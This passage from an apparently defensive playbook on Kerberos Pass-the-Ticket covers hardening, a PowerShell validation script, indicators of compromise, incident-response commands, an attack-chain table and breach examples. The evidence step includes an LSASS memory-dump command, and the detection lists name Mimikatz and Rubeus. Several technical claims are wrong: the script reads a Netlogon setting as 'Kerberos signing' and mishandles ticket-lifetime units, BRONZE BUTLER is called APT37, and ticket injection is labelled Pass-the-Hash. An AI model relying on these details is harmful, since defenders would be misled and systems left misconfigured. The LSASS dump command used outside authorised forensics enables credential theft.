    2. Click **+ New policy**
    3. Name: `Kerberos-Protected Resource Access`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Office 365 services + on-premises apps**
    5. **Conditions:**
       - Device platforms: **Windows**
       - Device state: **Require device to be marked as compliant**
    6. **Access controls:**
       - Grant: **Require device to be marked as compliant**
    7. Enable policy: **On**
    8. Click **Create**

*   **Disable Legacy Kerberos Versions:**
    Prevent downgrade attacks.
    
    **Manual Steps (Group Policy):**
    1. **Computer Configuration** → **Administrative Templates** → **System** → **Kerberos**
    2. Disable: **Allow forwardable tickets** (if not required)
    3. Disable: **Support DES encryption types** (deprecated)
    4. Disable: **Support RC4 encryption** (use AES-256 only)
    5. Apply via `gpupdate /force`

### Access Control & Policy Hardening

*   **RBAC Adjustment:** 
    Restrict Domain Admin group membership; use tiered admin model (Tier 0, 1, 2).
    
    **Manual Steps:**
    1. Open **Active Directory Users and Computers**
    2. Navigate to **Domain → Domain Controllers**
    3. Right-click → **Properties** → **Members**
    4. Remove service accounts not essential to DC operations
    5. Use Privileged Identity Management (PIM) for temporary elevation instead of permanent membership

*   **ReBAC / Conditional Access:**
    Apply resource-level access policies in hybrid environments.
    
    **Manual Steps (Entra ID Conditional Access):**
    1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Create policy: `Restrict Kerberos-Based Access to Sensitive Resources`
    3. Set **Target Resources** to sensitive apps (SharePoint, Teams, Exchange)
    4. Require **MFA** or **compliant device** for access

### Validation Command (Verify Fix)

```powershell
# Check if Kerberos signing is enforced
$signingLevel = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "SignSecureChannel" -ErrorAction SilentlyContinue).SignSecureChannel
if ($signingLevel -eq 1) {
    Write-Host "✓ Kerberos signing enforced"
} else {
    Write-Host "✗ Kerberos signing NOT enforced"
}

# Check ticket lifetime
$ticketLife = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "MaxTicketAge" -ErrorAction SilentlyContinue).MaxTicketAge
Write-Host "Maximum ticket lifetime: $($ticketLife / 60) minutes"

# Check LSA Protection status
$lsaProtection = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue).RunAsPPL
if ($lsaProtection -eq 1) {
    Write-Host "✓ LSA Protection (RunAsPPL) enabled"
} else {
    Write-Host "✗ LSA Protection NOT enabled"
}
```

**Expected Output (If Secure):**

```
✓ Kerberos signing enforced
Maximum ticket lifetime: 60 minutes
✓ LSA Protection (RunAsPPL) enabled
```

**What to Look For:**
- All three indicators should show enabled/enforced status.
- Ticket lifetime should be ≤ 60 minutes (default is 600).
- RunAsPPL must be `1` to protect LSASS.

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:** 
    - `*.kirbi` files in temporary directories (`C:\Temp\`, `C:\Windows\Temp\`, `C:\ProgramData\`)
    - Rubeus.exe, Mimikatz.exe, or variants with obfuscated names
    - Event logs with rapid TGS request generation (4769)

*   **Registry:** 
    - Modifications to `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\` (RunAsPPL disabled/tampered)
    - Added entries in `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` for Mimikatz/Rubeus

*   **Network:** 
    - Kerberos TGS requests (UDP/TCP 88) to sensitive services (krbtgt, ldap, cifs) from unexpected source IPs
    - Lateral movement via SMB (445) or RDP (3389) immediately following TGS requests

### Forensic Artifacts

*   **Disk:** 
    - Windows Event Log Security.evtx: Event ID 4769 (TGS requests), Event ID 4624 (logon events), Event ID 4688 (process creation for Mimikatz/Rubeus)
    - LSASS memory dump files in `C:\Windows\Temp\` or `C:\ProgramData\`
    - Bash history (Linux) showing `getTGT.py`, `getTGS.py` commands

*   **Memory:** 
    - LSASS.exe process contains Kerberos ticket structures (TGT/TGS) in cleartext
    - Ticket injection APIs (LsaCallAuthenticationPackage) called from Mimikatz/Rubeus context

*   **Cloud (Hybrid AD):** 
    - Azure AD sign-in logs showing repeated TGS requests from non-compliant device
    - AuditLogs entries for service principal token usage

*   **MFT/USN Journal:** 
    - Creation of `.kirbi` files; modification of Kerberos cache directories

### Response Procedures

1.  **Isolate:** 
    **Command (Immediate Network Isolation):**
    ```powershell
    # Disable all network adapters to prevent lateral movement
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    ```
    
    **Manual (Azure VM):**
    - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → **NIC** → **Network Security Group** → **Deny all inbound/outbound**

2.  **Collect Evidence:**
    **Command (Export Security Event Log):**
    ```powershell
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl System C:\Evidence\System.evtx
    
    # Dump LSASS process memory (if not protected)
    procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp
    
    # Collect Sysmon logs
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
    ```
    
    **Manual:**
    - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
    - Upload to forensic workstation for analysis

3.  **Remediate:**
    **Command (Kill malicious processes):**
    ```powershell
    # Stop any Mimikatz/Rubeus processes
    Get-Process | Where-Object {$_.Name -match "mimikatz|rubeus|.*kerberos.*"} | Stop-Process -Force
    
    # Clear Kerberos ticket cache
    klist purge
    
    # Invalidate all user sessions
    Reset-ComputerMachinePassword
    
    # Reset affected user passwords
    Set-ADAccountPassword -Identity "compromised-user" -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
    ```
    
    **Manual:**
    - Reset compromised user passwords via **Active Directory Users and Computers**
    - Reset computer account passwords: `Reset-ComputerMachinePassword` on the affected machine
    - Force logoff all users: `logoff /server:TargetServer`
    - Restart services: Restart Kerberos service (if applicable) via **Services.msc**

4.  **Long-Term Response:**
    - Audit all Domain Admin group membership; remove unnecessary accounts
    - Review and reduce Kerberos ticket lifetime in Group Policy
    - Enable LSA Protection (RunAsPPL) on all machines
    - Deploy Credential Guard on Windows 10/11 and Server 2019+
    - Implement EDR solution with Kerberos behavioral detection
    - Conduct full Active Directory assessment for persistence mechanisms

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into phishing link, steals MFA token |
| **2** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Extraction | Attacker gains local admin, dumps LSASS memory containing Kerberos tickets |
| **3** | **Current Step** | **[LM-AUTH-002]** | **Attacker injects stolen Kerberos ticket (TGT) into session** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Using injected ticket, move to Domain Controller |
| **5** | **Privilege Escalation** | [PE-TOKEN-002] RBCD | Exploit Resource-Based Constrained Delegation for DA access |
| **6** | **Persistence** | [CA-KERB-003] Golden Ticket | Create forged TGT using stolen krbtgt hash for persistent access |
| **7** | **Impact** | Ransomware/Exfil | Deploy ransomware or exfiltrate data across all AD resources |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: APT29 - SolarWinds Campaign (December 2020)

- **Target:** U.S. Government, Fortune 500 Tech Companies
- **Timeline:** December 2020 - February 2021
- **Technique Status:** APT29 used Pass-the-Ticket in hybrid environments to move from cloud-compromised service principal to on-premises domain controllers. They first compromised a SolarWinds software component, then leveraged stolen Kerberos tickets to escalate within victim networks.
- **Impact:** Complete compromise of multiple federal agencies; estimated 18,000+ organizations affected
- **Reference:** [Microsoft Threat Intelligence - APT29 SolarWinds](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-system-updates-in-windows-event-logs/)

### Example 2: BRONZE BUTLER / Tick APT (2015-2020)

- **Target:** Japanese organizations, defense contractors
- **Timeline:** Multiple campaigns, 2015-2020
- **Technique Status:** BRONZE BUTLER created forged Kerberos TGTs and TGSs to maintain administrative access across compromised networks. They used custom tools to inject and manage ticket lifetime.
- **Impact:** Long-term persistence (2+ years) on victim networks; theft of sensitive business and government data
- **Reference:** [MITRE - BRONZE BUTLER (APT37)](https://attack.mitre.org/groups/G0060/)

### Example 3: Domain Takeover via PTT (Real Red Team Exercise)

- **Target:** Fortune 500 Manufacturing Company
- **Timeline:** 3-day Red Team engagement
- **Technique Status:** Red Team obtained admin credentials via phishing, extracted TGT from Domain Admin workstation, injected TGT into attacker context, accessed Domain Controller and Global Catalog servers. Modified Domain Admin group membership to add backdoor account. Full domain takeover in <4 hours.
- **Impact:** Complete compromise of identity infrastructure; 500+ endpoints at risk
- **Defense Lesson:** Lack of LSA Protection and Kerberos armoring enabled swift lateral movement

---

## 16. RECOMMENDATIONS & ADVANCED HARDENING

### Immediate Actions (24 Hours)

1. **Deploy Sysmon & Enable LSASS Monitoring** – Detect future attempts
2. **Implement Kerberos Signing/Sealing** – Prevent ticket replay
3. **Reduce Ticket Lifetime to 60 minutes** – Limit exploitation window
4. **Enable LSA Protection (RunAsPPL)** – Prevent LSASS memory access

### Strategic Actions (30 Days)

1. **Implement Tiered Admin Model** – Separate Tier 0/1/2 admin accounts
2. **Deploy Credential Guard** – Windows 10/11 & Server 2019+
3. **Audit Domain Admin Group** – Remove unnecessary members
4. **Implement PIM (Privileged Identity Management)** – Just-in-time elevation

### Long-Term (90+ Days)

1. **Migrate to Passwordless Authentication** – Windows Hello for Business
2. **Implement Entra ID (Cloud-Only or Hybrid)** – Move away from on-premises only Kerberos
3. **Zero Trust Architecture** – Assume breach mentality; continuous verification
4. **SIEM Integration** – Centralized Kerberos event monitoring and correlation

---

## 17. REFERENCES & FURTHER READING

- [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [SpecterOps - Kerberos Attacks](https://specterops.io/blog/kerberos-attacks)
- [Microsoft Learn - Kerberos Protocol](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [Splunk Threat Research - Kerberos Detection](https://github.com/splunk/security_content)
- [Harmj0y - Active Directory Security](https://harmon.sh/)
- [The Hacker Recipes - Pass the Ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt)

---